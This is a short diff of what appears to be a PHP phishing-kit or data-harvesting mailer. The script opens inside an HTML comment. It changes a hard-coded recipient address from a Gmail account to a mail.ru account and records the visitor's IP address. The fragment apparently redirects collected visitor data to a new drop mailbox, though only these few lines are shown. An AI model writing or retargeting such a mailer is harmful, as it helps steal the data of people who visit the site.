@@ -1,5 +1,5 @@
 <!-- <?
-	$to ="kozinvo333@gmail.com";
+	$to ="aytugangster@mail.ru";
 
 	$ip = $_SERVER['REMOTE_ADDR'];
 
